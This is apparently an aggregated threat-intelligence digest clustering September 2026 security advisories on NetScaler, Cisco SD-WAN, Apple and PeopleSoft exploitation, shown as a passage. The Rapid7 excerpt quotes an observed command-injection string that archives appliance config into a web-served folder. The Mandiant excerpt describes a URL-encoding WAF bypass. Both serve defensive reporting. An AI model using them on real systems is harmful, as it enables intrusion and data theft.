Overview On September 27, 2026, Citrix disclosed eight new vulnerabilities affecting NetScaler ADC and NetScaler Gateway, including two critical remote code execution (RCE) vulnerabilities: CVE-2026-88771 and CVE-2026-88772 . Both of these RCE vulnerabilities carry a critical CVSSv4 score of 9.5, and both have been confirmed as being actively exploited in the wild as zero-days prior to the vendor disclosure . CVE-2026-88771 affects vulnerable NetScaler deployments in their default configuration, with no additional product features required. The vendor has also indicated that the attack complexity for exploiting CVE-2026-88771 is low, meaning reliable RCE is likely against all vulnerable NetScaler appliances regardless of their configuration. This is especially concerning due to the prevalence of NetScaler appliances. CVE-2026-88772 is a memory corruption vulnerability and requires the DTLS feature to be enabled on the appliance. The vendor has indicated that the attack complexity is hi
```

#### Full body

```
Vulnerability Management Zero-Day Exploitation of Citrix NetScaler ADC and Gateway: CVE-2026-88771 and CVE-2026-88772 Rapid7 Sep 28, 2026 | Last updated on Sep 30, 2026 | 4 min read Zero-Day Exploitation of Citrix NetScaler ADC and Gateway: CVE-2026-88771 and CVE-2026-88772 Table of contents Zero-Day Exploitation of Citrix NetScaler ADC and Gateway: CVE-2026-88771 and CVE-2026-88772 Table of contents Overview On September 27, 2026, Citrix disclosed eight new vulnerabilities affecting NetScaler ADC and NetScaler Gateway, including two critical remote code execution (RCE) vulnerabilities: CVE-2026-88771 and CVE-2026-88772 . Both of these RCE vulnerabilities carry a critical CVSSv4 score of 9.5, and both have been confirmed as being actively exploited in the wild as zero-days prior to the vendor disclosure . CVE-2026-88771 affects vulnerable NetScaler deployments in their default configuration, with no additional product features required. The vendor has also indicated that the attack complexity for exploiting CVE-2026-88771 is low, meaning reliable RCE is likely against all vulnerable NetScaler appliances regardless of their configuration. This is especially concerning due to the prevalence of NetScaler appliances. CVE-2026-88772 is a memory corruption vulnerability and requires the DTLS feature to be enabled on the appliance. The vendor has indicated that the attack complexity is high, meaning achieving reliable exploitation may be more difficult for an attacker than that of CVE-2026-88771. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) reports active exploitation is occurring globally, and added both CVE-2026-88771 and CVE-2026-88772 to its Known Exploited Vulnerabilities (KEV) catalog on September 27, 2026. Multiple CERTs worldwide have begun issuing alerts due to the critical nature of this situation. The following table summarizes all eight vulnerabilities: CVE CVSSv4 Vulnerability Exploitation confirmed CVE-2026-88771 9.5 (Critical) Improper input validation leading to RCE in a default configuration (CWE-20) Yes ( CISA ) CVE-2026-88772 9.5 (Critical) Memory overflow leading to RCE in a DTLS configuration (CWE-119) Yes ( CISA ) CVE-2026-88773 9.3 (Critical) HTTP request smuggling (CWE-444) No CVE-2026-88774 7.0 (High) Policy bypass involving URL expressions (CWE-16) No CVE-2026-88775 8.8 (High) Memory overflow in Gateway or AAA configuration (CWE-119) No CVE-2026-88776 8.8 (High) Memory overflow in load balancer of type Oracle configuration (CWE-119) No CVE-2026-88777 8.8 (High) Memory overflow in a LB/CS or CGNAT-LSN/NAT64 configuration (CWE-119) No CVE-2026-88778 8.8 (High) Predictable TCP initial sequence numbers (CWE-342) No Mitigation guidance The following vendor-supplied updates are available to remediate all eight vulnerabilities. Rapid7 strongly recommends updating affected NetScaler appliances on an emergency basis , outside of normal patching cycles, and investigating vulnerable appliances for signs of compromise. Citrix NetScaler ADC and Citrix NetScaler Gateway 14.1-73.37 and later releases. Citrix NetScaler ADC and Citrix NetScaler Gateway 13.1-64.23 and later releases of 13.1 . Citrix NetScaler ADC 14.1-FIPS , 14.1-73.37 FIPS and later releases of 14.1-FIPS . Citrix NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1.37.279 and later releases of 13.1-FIPS and 13.1-NDcPP . For the latest mitigation guidance, please refer to the vendor advisory . Rapid7 MDR Observed Exploitation Rapid7 observed the earliest exploitation attempts at 2026-09-20T14:28:43 UTC . Only two attempts were seen on September 20, which does not indicate widespread exploitation at that time. The command injection observed on September 20 is captured below: Timestamp: 2026-09-20T14:28:43.000Z Account: wfr Result: FAILED_BAD_LOGIN Source_ip: 149.104.78.208 Source_data: "Authentication is rejected for WFR pitboss PPE nsppe missed too many heartbeats NSPPE;tar${IFS}czf$IFS/var/netscaler/gui/vpn/c$IFS-C$IFS/flash${IFS}nsconfig; (client
```

#### Corroborating sources (16)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Zero-Day Exploitation of Citrix NetScaler ADC and Gateway: CVE-2026-88771 and CVE-2026-88772
  - Published: 2026-09-28T10:05:00+00:00
  - Link: https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772
  - Summary: Overview On September 27, 2026, Citrix disclosed eight new vulnerabilities affecting NetScaler ADC and NetScaler Gateway, including two critical remote code execution (RCE) vulnerabilities: CVE-2026-88771 and CVE-2026-88772 . Both of these RCE vulnerabilities carry a critical CVSSv4 score of 9.5, and both have been confirmed as being actively exploited in the wild as zero-days prior to the vendor disclosure . CVE-2026-88771 affects vulnerable NetScaler deployments in their default configuration, with no additional product features required. The vendor has also indicated that the attack complexity for exploiting CVE-2026-88771 is low, meaning reliable RCE is likely against all vulnerable NetScaler appliances regardless of their configuration. This is especially concerning due to the prevalence of NetScaler appliances. CVE-2026-88772 is a memory corruption vulnerability and requires the DTLS feature to be enabled on the appliance. The vendor has indicated that the attack complexity is hi
- **Unit 42** (threat_research_primary)
  - Title: Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30)
  - Published: 2026-09-30T20:00:04+00:00
  - Link: https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/
  - Summary: Unit 42 is aware of possible 0-day activity against NetScaler devices. Citrix reports CVE-2026-88771, CVE-2026-88772 have been exploited in the wild. The post Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30) appeared first on Unit 42 .
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: Defending Against Active Exploitation of Citrix NetScaler ADC and Gateway Appliances
  - Published: 2026-09-29T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances/
  - Summary: Introduction In late September 2026, Mandiant Consulting and Google Threat Intelligence Group (GTIG) identified active, in-the-wild exploitation of a zero-day vulnerability (CVE-2026-88772) affecting Citrix NetScaler ADC and NetScaler Gateway appliances. We have observed evidence that organizations in North America and Europe in the government, financial services, technology, education, and legal and professional services sectors were likely impacted by this exploitation campaign, which has been ongoing since at least early September. According to vendor disclosures, threat actors are also actively exploiting a second zero-day vulnerability (CVE-2026-88771). Exploitation of CVE-2026-88772 bypasses authentication and triggers an unhandled termination of the NetScaler Packet Processing Engine (NSPPE) to establish initial root-level access. Analysis of the actor’s post-exploitation toolkit reveals newly discovered custom PHP web shells, such as WHIPSHOT, capable of disguising Base64-encod
- **NCSC UK** (government_authoritative)
  - Title: Exploitation of vulnerabilities affecting Citrix NetScaler ADC and Citrix NetScaler Gateway
  - Published: 2026-09-28T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/news/exploitation-of-vulnerabilities-affecting-citrix-netscaler-adc-and-citrix-netscaler-gateway
  - Summary: The NCSC is urging UK organisations to promptly mitigate vulnerabilities affecting Citrix NetScaler ADC and Gateway, two of which are being actively exploited.
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-19490 | Citrix NetScaler ADC and NetScaler Gateway Authentication Bypass Vulnerability
  - Published: 2026-09-28T16:35:40+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-19490/
  - Summary: CVE-2026-19490 is a critical Citrix NetScaler ADC and Gateway authentication bypass vulnerability included in CISA’s Known Exploited Vulnerabilities catalog. NodeZero® Rapid Response safely validates exposure.
- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Critical Citrix NetScaler Zero-Days Under Active Exploitation
  - Published: 2026-09-29T15:42:55+00:00
  - Link: https://orca.security/resources/research/critical-citrix-netscaler-zero-days-under-active-exploitation/
  - Summary: Executive Summary: NetScaler RCE Risk and Patch Deadline Two critical vulnerabilities (CVE-2026-88771 and CVE-2026-88772, both CVSS 9.5) were disclosed affecting Citrix NetScaler ADC and NetScaler Gateway, allowing attackers to achieve unauthenticated remote code execution via improper input validation and memory overflow flaws. Due to confirmed active exploitation globally and their inclusion in CISA’s Known Exploited […]
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Defending Against Active Exploitation of Citrix NetScaler ADC and Gateway Appliances
  - Published: 2026-09-29T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances/
  - Summary: Introduction In late September 2026, Mandiant Consulting and Google Threat Intelligence Group (GTIG) identified active, in-the-wild exploitation of a zero-day vulnerability (CVE-2026-88772) affecting Citrix NetScaler ADC and NetScaler Gateway appliances. We have observed evidence that organizations in North America and Europe in the government, financial services, technology, education, and legal and professional services sectors were likely impacted by this exploitation campaign, which has been ongoing since at least early September. According to vendor disclosures, threat actors are also actively exploiting a second zero-day vulnerability (CVE-2026-88771). Exploitation of CVE-2026-88772 bypasses authentication and triggers an unhandled termination of the NetScaler Packet Processing Engine (NSPPE) to establish initial root-level access. Analysis of the actor’s post-exploitation toolkit reveals newly discovered custom PHP web shells, such as WHIPSHOT, capable of disguising Base64-encod
- **watchTowr Labs** (offensive_vulnerability_research)
  - Title: Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772)
  - Published: 2026-09-29T13:55:35+00:00
  - Link: https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/
  - Summary: Part 1 of this week's saga can be found here. This research is a glimpse into the capabilities that power our Preemptive Exposure Management solution, enabling organizations to rapidly react to emerging threats: the watchTowr Platform. What Is A Citrix NetScaler? NetScaler, from Citrix (now under Cloud
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Warning: Two Unpatched Citrix NetScaler RCE Zero-Days Under Active Exploitation
  - Published: 2026-09-27T07:47:57+00:00
  - Link: https://thehackernews.com/2026/09/warning-two-unpatched-citrix-netscaler.html
  - Summary: Two critical vulnerabilities in Citrix NetScaler ADC and NetScaler Gateway that allow remote code execution have been exploited in the wild, Citrix confirmed on September 27. It released fixes for both, along with six other flaws. One of the two affects every deployment on an affected version, including those in the default configuration. The bulletin came a day after security firm watchTowr
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Suspected state-sponsored hackers exploited NetScaler zero-day since early September (CVE-2026-88772)
  - Published: 2026-09-30T12:33:38+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/30/cve-2026-88772-netscaler-exploitation-zero-day/
  - Summary: “Advanced and suspected state-sponsored threat actors” are likely to be behind the initial targeted intrusions that leveraged CVE-2026-88772, one of the two recently disclosed NetScaler vulnerabilities that have been exploited as zero-days, says Mandiant CTO Charles Carmakal. Mandiant and Google Threat Intelligence Group (GTIG) know of dozens of impacted organizations across North America and Europe, he added, “including in the government, financial services, education, telecommunications, and legal and professional services sectors.” Two NetScaler zero-days exploited … More → The post Suspected state-sponsored hackers exploited NetScaler zero-day since early September (CVE-2026-88772) appeared first on Help Net Security .
- **Sophos X-Ops** (detection_response_operations)
  - Title: Citrix NetScaler vulnerabilities (CVE-2026-88771, CVE-2026-88772) in active exploitation
  - Published: 2026-09-28T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/citrix-netscaler-cve-2026-88771-cve-2026-88772-in-active-exploitation
  - Summary: Categories: Threat Research Tags: advisory, vulnerability, Citrix
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Citrix patches actively exploited NetScaler zero-days after a weekend of unofficial warnings
  - Published: 2026-09-29T00:58:15+00:00
  - Link: https://cyberscoop.com/citrix-zero-days-delayed-disclosure/
  - Summary: The vendor’s products are a common, recurring target for attackers, yet the official warning for some Citrix NetScaler customers was too late. The post Citrix patches actively exploited NetScaler zero-days after a weekend of unofficial warnings appeared first on CyberScoop .
- **GreyNoise** (cloud_identity_infrastructure)
  - Title: Swarming Against Citrix 0-Day Exploitation
  - Published: 2026-09-28T00:00:00+00:00
  - Link: https://www.greynoise.io/blog/swarming-against-citrix-0-day-exploitation
  - Summary: On 24 September 2026, a malicious cyber actor (MCA) used 149.104.78.141 to attempt zero-day exploitation against a Citrix NetScaler Gateway. At the time, there were no CVE-specific detections for the attack due to it occurring pre-disclosure. However, GreyNoise still detected and labeled the activity as fundamentally malicious within seconds due to behavioral detections.
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Government, Finance Orgs Targeted in Weeks-Long NetScaler Zero-Day Attacks
  - Published: 2026-09-30T12:48:20+00:00
  - Link: https://www.securityweek.com/government-finance-orgs-targeted-in-weeks-long-netscaler-zero-day-attacks/
  - Summary: Several security firms have confirmed seeing exploitation of the NetScaler vulnerabilities CVE-2026-88771 and CVE-2026-88772. The post Government, Finance Orgs Targeted in Weeks-Long NetScaler Zero-Day Attacks appeared first on SecurityWeek .
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Hackers exploit Citrix NetScaler zero-day to deploy web shells
  - Published: 2026-09-29T18:37:12+00:00
  - Link: https://www.bleepingcomputer.com/news/security/hackers-exploit-citrix-netscaler-zero-day-to-deploy-web-shells/
  - Summary: Cybersecurity firms say attackers exploited the Citrix NetScaler CVE-2026-88772 zero-day to deploy custom web shells and tunneling malware, gain root access, steal credentials, and spread into internal networks. [...]
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772) - watchTowr Labs
  - Published: 2026-09-29T13:57:34+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1wtattu/here_we_go_again_citrix_netscaler_dtls_preauth/
  - Summary: submitted by /u/dx7r__ [link] [comments]

### Cluster e8f8b3bb19 — score 71

- Title: Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504)
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-30T15:09:22+00:00
- Link: https://www.rapid7.com/blog/post/etr-critical-cisco-catalyst-sd-wan-manager-api-authentication-bypass-exploited-in-the-wild-cve-2026-76504
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: CVE-2026-76504

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Cisco
- cve_ids: CVE-2026-20127, CVE-2026-20182, CVE-2026-76504
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Cisco
- cve_ids: CVE-2026-76504, CVE-2026-20127, CVE-2026-20182
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On September 30, 2026, Cisco published a security advisory for CVE-2026-76504 , a critical API authentication bypass vulnerability affecting Cisco Catalyst SD-WAN Manager. The vulnerability has a CVSSv3.1 score of 9.8 and results from improper handling of URL encoding ( CWE-177 ). An unauthenticated, remote attacker can send a crafted HTTP request that bypasses an authentication rule for a specific API endpoint, gaining access to the API with the privileges of the admin user. According to Cisco, CVE-2026-76504 is being actively exploited in the wild; Cisco PSIRT became aware of the activity in September 2026. Cisco Catalyst SD-WAN Manager systems with ports exposed to the internet are at risk of compromise. The vulnerability affects the product regardless of system configuration, and Cisco has not provided a workaround, however vendor supplied updates are available. Rapid7 strongly recommends that organizations upgrade affected systems to a fixed release on an emergency basis,
```

#### Full body

```
Emergent Threat Response Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504) Rapid7 Sep 30, 2026 | Last updated on Sep 30, 2026 | 3 min read Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504) Table of contents Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504) Table of contents Overview On September 30, 2026, Cisco published a security advisory for CVE-2026-76504 , a critical API authentication bypass vulnerability affecting Cisco Catalyst SD-WAN Manager. The vulnerability has a CVSSv3.1 score of 9.8 and results from improper handling of URL encoding ( CWE-177 ). An unauthenticated, remote attacker can send a crafted HTTP request that bypasses an authentication rule for a specific API endpoint, gaining access to the API with the privileges of the admin user. According to Cisco, CVE-2026-76504 is being actively exploited in the wild; Cisco PSIRT became aware of the activity in September 2026. Cisco Catalyst SD-WAN Manager systems with ports exposed to the internet are at risk of compromise. The vulnerability affects the product regardless of system configuration, and Cisco has not provided a workaround, however vendor supplied updates are available. Rapid7 strongly recommends that organizations upgrade affected systems to a fixed release on an emergency basis, outside of normal patch cycles, and investigate internet-facing systems for signs of exploitation. Cisco Catalyst SD-WAN Manager was also affected by two critical, unauthenticated peering authentication flaws earlier in 2026: CVE-2026-20127 and Rapid7-discovered CVE-2026-20182 . Both were distinct issues in the vdaemon service and similar parts of its networking stack. CVE-2026-76504 targets a separate API authentication path, but the recurrence of authentication bypasses in internet-facing Catalyst SD-WAN control components reinforces the need for emergency remediation. Mitigation guidance Cisco has released software updates that remediate CVE-2026-76504. Organizations running affected instances of Cisco Catalyst SD-WAN Manager should upgrade to an appropriate fixed release listed below without waiting for a regular patch cycle: Cisco Catalyst SD-WAN Software release First fixed release Earlier than 20.9 Migrate to a fixed release 20.9 20.9.10.1 20.12 20.12.8.2 20.15 20.15.6.1 20.18 20.18.4.1 26.1 26.1.2.1 26.2 26.2.1 Cisco has addressed the vulnerability in the cloud-based Cisco SD-WAN Cloud (Cisco Managed) release 20.15.605 , and indicates that no customer action is required for that service. There are no workarounds. As a temporary mitigation, Cisco recommends that on-premises customers prevent access to the system from unsecured networks. If internet access is required, restrict access to known, trusted hosts and protect Cisco Catalyst SD-WAN control components behind a filtering device. Cisco indicates that this mitigation is already deployed in Cisco Catalyst SD-WAN Cloud Hosted environments. Organizations should apply updates even when the mitigation is in place. Because active exploitation has occurred, Rapid7 strongly recommends that organizations audit affected systems for compromise. For help assessing a potentially compromised system, Cisco customers may open a Severity 3 TAC case with CVE-2026-76504 in the title and provide an admin-tech file generated with the request admin-tech command. For the latest mitigation guidance and release compatibility information, please refer to the vendor's security advisory . Rapid7 customers Exposure Command, Vulnerability Management, and Nexpose Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-76504 with vulnerability checks expected to be available in the October 1 content release. Indicators of compromise Cisco recommends reviewing the following logs for requests related to j_security_check from unknown or unauthorize
```

#### Corroborating sources (4)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504)
  - Published: 2026-09-30T15:09:22+00:00
  - Link: https://www.rapid7.com/blog/post/etr-critical-cisco-catalyst-sd-wan-manager-api-authentication-bypass-exploited-in-the-wild-cve-2026-76504
  - Summary: Overview On September 30, 2026, Cisco published a security advisory for CVE-2026-76504 , a critical API authentication bypass vulnerability affecting Cisco Catalyst SD-WAN Manager. The vulnerability has a CVSSv3.1 score of 9.8 and results from improper handling of URL encoding ( CWE-177 ). An unauthenticated, remote attacker can send a crafted HTTP request that bypasses an authentication rule for a specific API endpoint, gaining access to the API with the privileges of the admin user. According to Cisco, CVE-2026-76504 is being actively exploited in the wild; Cisco PSIRT became aware of the activity in September 2026. Cisco Catalyst SD-WAN Manager systems with ports exposed to the internet are at risk of compromise. The vulnerability affects the product regardless of system configuration, and Cisco has not provided a workaround, however vendor supplied updates are available. Rapid7 strongly recommends that organizations upgrade affected systems to a fixed release on an emergency basis,
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-76504 | Cisco Catalyst SD-WAN Manager API Authentication Bypass Vulnerability | Reversed by Horizon3
  - Published: 2026-10-01T00:35:46+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76504/
  - Summary: CVE-2026-76504 is a critical, actively exploited Cisco Catalyst SD-WAN Manager vulnerability that allows unauthenticated API access as the admin user. Horizon3 reverse engineered the flaw, and NodeZero® Rapid Response safely validates exposure.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco Warns of Attackers Exploiting Critical Authentication Bypass in SD-WAN Manager
  - Published: 2026-09-30T15:24:54+00:00
  - Link: https://thehackernews.com/2026/09/cisco-warns-of-attackers-exploiting.html
  - Summary: Attackers are exploiting a new critical zero-day flaw in Cisco Catalyst SD-WAN Manager, the system companies use to manage their Cisco SD-WAN networks, Cisco said in an advisory on September 30. The flaw, CVE-2026-76504, could allow a remote attacker with no login access to use the Manager's API as the admin user. Fixed releases are available, and there is no workaround. It carries a
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Cisco warns of new SD-WAN zero-day exploited in attacks
  - Published: 2026-09-30T14:46:40+00:00
  - Link: https://www.bleepingcomputer.com/news/security/cisco-warns-of-new-sd-wan-authentication-bypass-zero-day-exploited-in-attacks/
  - Summary: Cisco released security updates to address a critical zero-day in the Catalyst SD-WAN Manager (tracked as CVE-2026-76504) that attackers are actively exploiting to escalate to admin privileges. [...]

### Cluster b4817022a8 — score 33

- Title: Apple Emergency Patch for iOS 26, macOS26, macOS15 (CVE-2026-86950), (Mon, Sep 28th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-28T22:35:35+00:00
- Link: https://isc.sans.edu/diary/rss/33376
- Fetch status: fetch_failed:HTTPError
- Member count: 7
- Corroborating source count: 5
- Strong signals: Apple iOS/macOS, CVE-2026-86950

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor, zero_day
- affected_industries: financial_services
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-86950
- urgency_signals: emergency_patch, no_patch_yet, poc_available, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_government, tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-86950
- urgency_signals: emergency_patch
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_government

#### Summary

```
Apple today released patches for all of its operating systems. However, only patches for older branches include a security fix. The vulnerability being addressed in iOS 26, macOS 26 and macOS 15 is already being exploited. iOS and macOS 27 are not affected. Today&#;x26;#;39;s update for the current "27" branch does not address security issues, but fixes some functional issues that got caught after the release two weeks ago. A 27.1 version was also expected to support the new foldable iPhone and will likely include specific features geared to the soon to be available device.
```

#### Corroborating sources (5)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Apple Emergency Patch for iOS 26, macOS26, macOS15 (CVE-2026-86950), (Mon, Sep 28th)
  - Published: 2026-09-28T22:35:35+00:00
  - Link: https://isc.sans.edu/diary/rss/33376
  - Summary: Apple today released patches for all of its operating systems. However, only patches for older branches include a security fix. The vulnerability being addressed in iOS 26, macOS 26 and macOS 15 is already being exploited. iOS and macOS 27 are not affected. Today&#;x26;#;39;s update for the current "27" branch does not address security issues, but fixes some functional issues that got caught after the release two weeks ago. A 27.1 version was also expected to support the new foldable iPhone and will likely include specific features geared to the soon to be available device.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Apple CoreGraphics PoC Emerges as WhatsApp PDF Checks Hint at Possible Delivery Path
  - Published: 2026-10-01T05:54:41+00:00
  - Link: https://thehackernews.com/2026/10/apple-coregraphics-poc-emerges-as.html
  - Summary: Security researchers have published the first public proof-of-concept for CVE-2026-86950, an Apple CoreGraphics flaw Apple says may have been used in attacks against specific targeted individuals. The trigger is a malicious PDF with a crafted embedded font that crashes unpatched iPhones and Macs. The code causes a crash, not an execution error. Turning the memory corruption into a working
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Apple Zero-Day Vulnerability Weaponized in Targeted Attacks
  - Published: 2026-09-29T21:31:29+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/apple-zero-day-vulnerability-weaponized-targeted-attacks
  - Summary: Attackers are exploiting CVE-2026-86950, an out-of-bounds write flaw, in an extremely sophisticated fashion, according to Apple.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Apple Patches CoreGraphics Zero Day Exploited in Attacks
  - Published: 2026-09-30T08:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/apple-patches-coregraphics-zero/
  - Summary: Apple has patched CVE-2026-86950, a zero-day bug in the iOS CoreGraphics engine
- **Kaspersky Securelist** (threat_research_primary)
  - Title: MacSync under the microscope: new delivery methods and a new payload
  - Published: 2026-09-24T10:00:21+00:00
  - Link: https://securelist.com/macsync-new-version/121383/
  - Summary: We look at a new version of the MacSync macOS stealer with a backdoor module that targets crypto enthusiasts and developers.

### Cluster 6a53a92578 — score 33

- Title: ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-09-25T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-renewed-mass-exploitation-campaign-targeting-oracle-peoplesoft/
- Fetch status: ok
- Member count: 10
- Corroborating source count: 7
- Strong signals: CVE-2026-35273, ShinyHunters, UNC6240

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, web_shell_backdoor, zero_day
- actor_attribution: Cl0p, ShinyHunters, UNC6240
- affected_industries: education, financial_services, government, healthcare
- cve_ids: CVE-2026-35273
- urgency_signals: preauth_unauth, zero_day
- content_type: incident_report, news_report
- confidence_tier: tier_1_primary_research, tier_2_operator, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor
- actor_attribution: ShinyHunters, UNC6240
- affected_industries: healthcare, government, education
- cve_ids: CVE-2026-35273
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Introduction As an update to the June 2026 post, ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit , Mandiant and Google Threat Intelligence Group (GTIG) have identified renewed mass exploitation of CVE-2026-35273 by UNC6240 (ShinyHunters), along with expanded global targeting across multiple sectors. In June, the threat actor exploited this vulnerability as a zero-day predominantly against academic institutions. This new wave of activity stems from UNC6240 modifying its exploit to bypass web application firewall (WAF) rules blocking the vulnerable Environment Management Hub (PSEMHUB) endpoint. The threat actor bypassed these string-based WAF rules by URL-encoding a single character in the request path, requesting /%50SEMHUB/ in place of /PSEMHUB/ . Many WAF and reverse proxy rules match the literal path before URL decoding, while the PeopleSoft application server decodes the request and routes it to the vulnerable servlet. This allows the threat actor to reach the e
```

#### Full body

```
Threat Intelligence ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft September 25, 2026 Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Introduction As an update to the June 2026 post, ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit , Mandiant and Google Threat Intelligence Group (GTIG) have identified renewed mass exploitation of CVE-2026-35273 by UNC6240 (ShinyHunters), along with expanded global targeting across multiple sectors. In June, the threat actor exploited this vulnerability as a zero-day predominantly against academic institutions. This new wave of activity stems from UNC6240 modifying its exploit to bypass web application firewall (WAF) rules blocking the vulnerable Environment Management Hub (PSEMHUB) endpoint. The threat actor bypassed these string-based WAF rules by URL-encoding a single character in the request path, requesting /%50SEMHUB/ in place of /PSEMHUB/ . Many WAF and reverse proxy rules match the literal path before URL decoding, while the PeopleSoft application server decodes the request and routes it to the vulnerable servlet. This allows the threat actor to reach the endpoint on systems whose operators may have believed their WAF rules had mitigated the exposure. Our analysis indicates that the threat actor expanded their targeting in this recent campaign, deploying web shells on dozens of systems globally, spanning higher education, technology, IT services, healthcare, agriculture, transportation, and government. Mandiant recommends that organizations running Oracle PeopleSoft take the following immediate actions. Additional remediation and hardening guidance is included later in this post. Remediation and Hardening Quick Guide Apply the Oracle Security Alert patch for CVE-2026-35273. WAF rules and path-based blocking are not a substitute for patching. Disable the Environment Management Hub (EMHub) service in multi-server configurations, or remove the PSEMHUB application entirely in single-server configurations, as advised in Oracle's security alert guidance . Search PIA WebLogic access logs for requests to /PSEMHUB/ and any percent-encoded variant (for example, /%50SEMHUB/ ), particularly POST requests to /hub and requests to .jsp files from external source IP addresses. Inspect <PS_CFG_HOME>/webserv/<domain>/applications/peoplesoft/PSEMHUB.war/ for files that are not part of the shipped product, including but not limited to x.jsp , u.jsp , tunnel.jsp , tunnel.jspx , and Ple64.exe . Rotate credentials readable by the PeopleSoft application service account, including database connection strings in psappsrv.cfg , Integration Broker credentials, and any cloud credentials reachable from the web tier. Monitor outbound traffic from PeopleSoft hosts to the network indicators listed in this post, and review endpoints for unexpected MeshCentral agents. Figure 1: Remediation and hardening quick guide Background: From Zero-Day to N-Day In June 2026, we reported a UNC6240 campaign that exploited CVE-2026-35273 as a zero-day between May 27 and June 9, 2026, predominantly against higher education institutions. Oracle released an out-of-band Security Alert on June 10, 2026. Mandiant’s June guidance recommended patching and, where patching or disabling EMHub was not immediately possible, blocking external access to /PSEMHUB/* at the perimeter, noting that WAF body-inspection rules alone were insufficient. The current campaign demonstrates that UNC6240 adapted to published defensive guidance, targeting organizations that implemented WAF rules but did not patch the vulnerability. Attack Lifecycle We observed a consistent sequence of events in targeted PeopleSoft environments, progressing from discovery and verification to web shell deployment and hands-on-keyboard activity. Target Verification Before exploitation, targeted servers typically received five to 15 POST requests to /%50SEMHUB/hub containing a serialized J
```

#### Corroborating sources (7)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft
  - Published: 2026-09-25T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-renewed-mass-exploitation-campaign-targeting-oracle-peoplesoft/
